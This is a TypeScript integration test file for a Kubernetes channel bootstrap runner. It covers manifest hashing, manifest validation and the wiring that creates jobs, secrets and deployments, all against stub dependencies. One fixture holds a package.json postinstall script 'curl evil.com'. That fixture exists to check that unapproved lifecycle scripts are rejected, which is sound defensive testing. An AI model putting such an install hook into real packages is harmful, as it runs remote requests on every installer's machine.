/**
 * Integration tests for Story 174: bootstrap channel runner.
 *
 * Unlike unit tests (bootstrap-runner.test.ts), these tests exercise multiple
 * components together:
 *   - bootstrapChannelFromSkill (bootstrap-runner.ts)
 *   - processCommitChannelConfig (ipc-redis-bootstrap.ts)
 *   - The full dep-injection wiring that index.ts sets up
 *
 * No real Kubernetes or Redis is used — we inject stub implementations
 * of the K8s API and Redis clients. The integration point tested is that
 * the bootstrap-runner correctly calls through its deps in the right order,
 * and that processCommitChannelConfig correctly uses its deps.
 *
 * Real logic exercised end-to-end:
 *   - canonicalJson + computeManifestHash (pure functions, no mocks)
 *   - validateChannelManifest schema guard
 *   - bootstrapChannelFromSkill job-creation wiring
 *   - processCommitChannelConfig secret + deployment creation wiring
 *   - releaseBootstrap removes instanceName from the shared activeBootstraps Map
 */

import { describe, it, expect, beforeEach } from 'vitest';
import type { V1Job, V1PersistentVolumeClaim } from '@kubernetes/client-node';
import type { V1Deployment } from '@kubernetes/client-node';

import {
  bootstrapChannelFromSkill,
  computeManifestHash,
  canonicalJson,
  validateChannelManifest,
} from './bootstrap-runner.js';
import type { BootstrapK8sDeps } from './bootstrap-runner.js';
import { processCommitChannelConfig } from './ipc-redis-bootstrap.js';
import type {
  CommitChannelConfigDeps,
  CommitChannelConfigPayload,
} from './ipc-redis-bootstrap.js';

// ── Helpers ──────────────────────────────────────────────────────────────────

function makeFakeK8sDeps(): BootstrapK8sDeps & {
  createdJobs: V1Job[];
  createdPvcs: V1PersistentVolumeClaim[];
} {
  const createdJobs: V1Job[] = [];
  const createdPvcs: V1PersistentVolumeClaim[] = [];

  return {
    createdJobs,
    createdPvcs,
    coreV1: {
      createNamespacedPersistentVolumeClaim: async ({
        body,
      }: {
        body: V1PersistentVolumeClaim;
      }) => {
        createdPvcs.push(body);
        return body as any;
      },
      readNamespacedConfigMap: async () => {
        return {
          data: {
            'bootstrap-telegram.md':
              '---\nchannelType: telegram\n---\nSetup steps',
          },
        } as any;
      },
    } as any,
    batchV1: {
      createNamespacedJob: async ({ body }: { body: V1Job }) => {
        createdJobs.push(body);
        return body as any;
      },
    } as any,
  };
}

function makeCommitDeps(): CommitChannelConfigDeps & {
  createdSecrets: Array<{ name: string; data: Record<string, string> }>;
  createdDeployments: V1Deployment[];
  replies: Array<{ channel: string; payload: unknown }>;
  sseMessages: Array<{ topic: string; text: string }>;
  releasedInstances: string[];
} {
  const createdSecrets: Array<{ name: string; data: Record<string, string> }> =
    [];
  const createdDeployments: V1Deployment[] = [];
  const replies: Array<{ channel: string; payload: unknown }> = [];
  const sseMessages: Array<{ topic: string; text: string }> = [];
  const releasedInstances: string[] = [];

  return {
    createdSecrets,
    createdDeployments,
    replies,
    sseMessages,
    releasedInstances,
    createSecret: async (name: string, data: Record<string, string>) => {
      createdSecrets.push({ name, data });
    },
    createDeployment: async (body: V1Deployment) => {
      createdDeployments.push(body);
    },
    publishReply: async (replyChannel: string, payload: unknown) => {
      replies.push({ channel: replyChannel, payload });
    },
    publishSse: async (topic: string, text: string) => {
      sseMessages.push({ topic, text });
    },
    getManifestHash: async () => null,
    releaseBootstrap: (instanceName: string) => {
      releasedInstances.push(instanceName);
    },
  };
}

// ── Pure-function integration: canonicalJson + computeManifestHash ────────────

describe('canonicalJson + computeManifestHash (pure functions)', () => {
  it('produces a stable hash for equivalent objects with different key order', () => {
    const pkg1 = JSON.stringify({
      name: 'channel-base',
      version: '1.0.0',
      dependencies: { redis: '^4.7.0' },
    });
    const pkg2 = JSON.stringify({
      dependencies: { redis: '^4.7.0' },
      version: '1.0.0',
      name: 'channel-base',
    });
    const lock = JSON.stringify({ lockfileVersion: 3, packages: {} });

    const hash1 = computeManifestHash(pkg1, lock);
    const hash2 = computeManifestHash(pkg2, lock);
    expect(hash1).toBe(hash2);
  });

  it('produces different hashes for different package versions', () => {
    const pkg1 = JSON.stringify({
      name: 'channel-base',
      dependencies: { redis: '^4.7.0' },
    });
    const pkg2 = JSON.stringify({
      name: 'channel-base',
      dependencies: { redis: '^4.8.0' },
    });
    const lock = JSON.stringify({ lockfileVersion: 3, packages: {} });

    expect(computeManifestHash(pkg1, lock)).not.toBe(
      computeManifestHash(pkg2, lock),
    );
  });

  it('canonicalJson sorts nested object keys', () => {
    const obj = { z: 1, a: { y: 2, b: 3 } };
    const result = canonicalJson(obj);
    expect(result).toBe('{"a":{"b":3,"y":2},"z":1}');
  });
});

// ── Schema integration: validateChannelManifest ───────────────────────────────

describe('validateChannelManifest', () => {
  it('accepts a valid manifest with no devDependencies or scripts', () => {
    const manifest = {
      packageJson: JSON.stringify({
        name: 'test',
        version: '1.0.0',
        dependencies: { redis: '^4.7.0' },
      }),
      packageLockJson: JSON.stringify({ lockfileVersion: 3, packages: {} }),
    };
    expect(() => validateChannelManifest(manifest)).not.toThrow();
  });

  it('rejects a manifest with devDependencies', () => {
    const manifest = {
      packageJson: JSON.stringify({
        name: 'test',
        devDependencies: { vitest: '^2.0.0' },
      }),
      packageLockJson: JSON.stringify({ lockfileVersion: 3, packages: {} }),
    };
    expect(() => validateChannelManifest(manifest)).toThrow(/devDependencies/);
  });

  it('rejects a manifest with unapproved lifecycle scripts', () => {
    const manifest = {
      packageJson: JSON.stringify({
        name: 'test',
        scripts: { postinstall: 'curl evil.com' },
      }),
      packageLockJson: JSON.stringify({ lockfileVersion: 3, packages: {} }),
    };
    expect(() => validateChannelManifest(manifest)).toThrow(
      /scripts not allowed/,
    );
  });

  it('allows lifecycle scripts that are in the allowlist', () => {
    const manifest = {
      packageJson: JSON.stringify({
        name: 'test',
        scripts: { postinstall: 'echo ok' },
      }),
      packageLockJson: JSON.stringify({ lockfileVersion: 3, packages: {} }),
    };
    expect(() =>
      validateChannelManifest(manifest, ['postinstall']),
    ).not.toThrow();
  });
});

// ── End-to-end: bootstrapChannelFromSkill wiring ──────────────────────────────

describe('bootstrapChannelFromSkill (bootstrap-runner integration)', () => {
  let k8sDeps: ReturnType<typeof makeFakeK8sDeps>;
  const activeBootstraps = new Map<string, string>();

  beforeEach(() => {
    k8sDeps = makeFakeK8sDeps();
    activeBootstraps.clear();
  });

  it('creates PVC and Job in the correct namespace', async () => {
    await bootstrapChannelFromSkill({
      skillName: 'bootstrap-telegram',
      channelType: 'telegram',
      instanceName: 'tg-integ',
      k8sDeps,
      namespace: 'kubeclaw-test',
      channelBaseImage: 'kubeclaw-channel-base:test',
      activeBootstraps,
    });

    expect(k8sDeps.createdPvcs).toHaveLength(1);
    expect(k8sDeps.createdPvcs[0].metadata?.namespace).toBe('kubeclaw-test');
    expect(k8sDeps.createdJobs).toHaveLength(1);
    expect(k8sDeps.createdJobs[0].metadata?.namespace).toBe('kubeclaw-test');
  });

  it('PVC name follows kubeclaw-channel-<instance>-runtime convention', async () => {
    await bootstrapChannelFromSkill({
      skillName: 'bootstrap-telegram',
      channelType: 'telegram',
      instanceName: 'tg-integ',
      k8sDeps,
      namespace: 'kubeclaw-test',
      channelBaseImage: 'kubeclaw-channel-base:test',
      activeBootstraps,
    });

    expect(k8sDeps.createdPvcs[0].metadata?.name).toBe(
      'kubeclaw-channel-tg-integ-runtime',
    );
  });

  it('Job name follows kubeclaw-bootstrap-<instance> convention', async () => {
    await bootstrapChannelFromSkill({
      skillName: 'bootstrap-telegram',
      channelType: 'telegram',
      instanceName: 'tg-integ',
      k8sDeps,
      namespace: 'kubeclaw-test',
      channelBaseImage: 'kubeclaw-channel-base:test',
      activeBootstraps,
    });

    expect(k8sDeps.createdJobs[0].metadata?.name).toBe(
      'kubeclaw-bootstrap-tg-integ',
    );
  });

  it('Job has KUBECLAW_SUPERUSER=true and KUBECLAW_BOOTSTRAP_SKILL env vars', async () => {
    await bootstrapChannelFromSkill({
      skillName: 'bootstrap-telegram',
      channelType: 'telegram',
      instanceName: 'tg-integ',
      k8sDeps,
      namespace: 'kubeclaw-test',
      channelBaseImage: 'kubeclaw-channel-base:test',
      activeBootstraps,
    });

    const envVars =
      k8sDeps.createdJobs[0].spec?.template?.spec?.containers?.[0]?.env ?? [];
    const envMap = Object.fromEntries(envVars.map((e) => [e.name, e.value]));
    expect(envMap['KUBECLAW_SUPERUSER']).toBe('true');
    expect(envMap['KUBECLAW_BOOTSTRAP_SKILL']).toBe('bootstrap-telegram');
  });

  it('registers bootstrapJobId in activeBootstraps Map', async () => {
    const result = await bootstrapChannelFromSkill({
      skillName: 'bootstrap-telegram',
      channelType: 'telegram',
      instanceName: 'tg-integ',
      k8sDeps,
      namespace: 'kubeclaw-test',
      channelBaseImage: 'kubeclaw-channel-base:test',
      activeBootstraps,
    });

    expect(activeBootstraps.get('tg-integ')).toBe(result.bootstrapJobId);
  });

  it('returns alreadyInProgress=true when instance is already bootstrapping', async () => {
    activeBootstraps.set('tg-integ', 'existing-job');

    const result = await bootstrapChannelFromSkill({
      skillName: 'bootstrap-telegram',
      channelType: 'telegram',
      instanceName: 'tg-integ',
      k8sDeps,
      namespace: 'kubeclaw-test',
      channelBaseImage: 'kubeclaw-channel-base:test',
      activeBootstraps,
    });

    expect(result.alreadyInProgress).toBe(true);
    expect(k8sDeps.createdJobs).toHaveLength(0);
    expect(k8sDeps.createdPvcs).toHaveLength(0);
  });
});

// ── End-to-end: processCommitChannelConfig wiring ────────────────────────────

describe('processCommitChannelConfig (bootstrap commit integration)', () => {
  let deps: ReturnType<typeof makeCommitDeps>;

  const payload: CommitChannelConfigPayload = {
    type: 'commit_channel_config',
    bootstrapJobId: 'integ-job-456',
    channel_type: 'telegram',
    instance_name: 'tg-integ',
    secret_data: { TELEGRAM_BOT_TOKEN: 'integ:test-token' },
  };

  beforeEach(() => {
    deps = makeCommitDeps();
  });

  it('creates Secret and Deployment in sequence, then replies success', async () => {
    await processCommitChannelConfig(
      payload,
      deps,
      'kubeclaw-test',
      'kubeclaw-channel-base:latest',
    );

    expect(deps.createdSecrets).toHaveLength(1);
    expect(deps.createdDeployments).toHaveLength(1);
    expect(deps.replies).toHaveLength(1);
    expect(deps.replies[0].payload).toEqual({ ok: true });
  });

  it('Secret name and Deployment name follow naming conventions', async () => {
    await processCommitChannelConfig(
      payload,
      deps,
      'kubeclaw-test',
      'kubeclaw-channel-base:latest',
    );

    expect(deps.createdSecrets[0].name).toBe(
      'kubeclaw-channel-tg-integ-credentials',
    );
    expect(deps.createdDeployments[0].metadata?.name).toBe(
      'kubeclaw-channel-tg-integ',
    );
  });

  it('Secret data matches the secret_data from the payload', async () => {
    await processCommitChannelConfig(
      payload,
      deps,
      'kubeclaw-test',
      'kubeclaw-channel-base:latest',
    );

    expect(deps.createdSecrets[0].data).toEqual({
      TELEGRAM_BOT_TOKEN: 'integ:test-token',
    });
  });

  it('releaseBootstrap is called with the instance name', async () => {
    await processCommitChannelConfig(
      payload,
      deps,
      'kubeclaw-test',
      'kubeclaw-channel-base:latest',
    );

    expect(deps.releasedInstances).toContain('tg-integ');
  });

  it('shared activeBootstraps Map is cleared after commit via releaseBootstrap', async () => {
    const activeBootstraps = new Map<string, string>([
      ['tg-integ', 'integ-job-456'],
    ]);

    await processCommitChannelConfig(
      payload,
      {
        ...deps,
        releaseBootstrap: (instanceName: string) => {
          activeBootstraps.delete(instanceName);
        },
      },
      'kubeclaw-test',
      'kubeclaw-channel-base:latest',
    );

    expect(activeBootstraps.has('tg-integ')).toBe(false);
  });

  it('publishes SSE notification on success', async () => {
    await processCommitChannelConfig(
      payload,
      deps,
      'kubeclaw-test',
      'kubeclaw-channel-base:latest',
    );

    expect(deps.sseMessages).toHaveLength(1);
    expect(deps.sseMessages[0].text).toContain('ready');
    expect(deps.sseMessages[0].topic).toBe('kubeclaw:bootstrap:integ-job-456');
  });

  it('publishes failure reply and SSE if createSecret throws, does not create Deployment', async () => {
    const failDeps = {
      ...deps,
      createSecret: async () => {
        throw new Error('K8s 403 Forbidden');
      },
    };

    await processCommitChannelConfig(
      payload,
      failDeps,
      'kubeclaw-test',
      'kubeclaw-channel-base:latest',
    );

    expect(deps.createdDeployments).toHaveLength(0);
    expect(deps.replies[0].payload).toMatchObject({ ok: false });
    expect(deps.sseMessages[0].text).toContain('K8s 403 Forbidden');
  });
});
